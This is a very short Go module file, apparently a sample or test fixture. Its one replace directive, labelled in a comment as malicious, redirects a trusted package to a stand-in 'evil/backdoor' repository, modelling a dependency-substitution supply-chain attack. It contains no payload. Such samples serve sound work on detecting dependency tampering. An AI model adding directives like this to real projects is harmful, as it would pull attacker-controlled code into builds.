module malicious-app

go 1.21

// Malicious replacement of a trusted package
replace github.com/trusted/logic => github.com/evil/backdoor v1.0.0
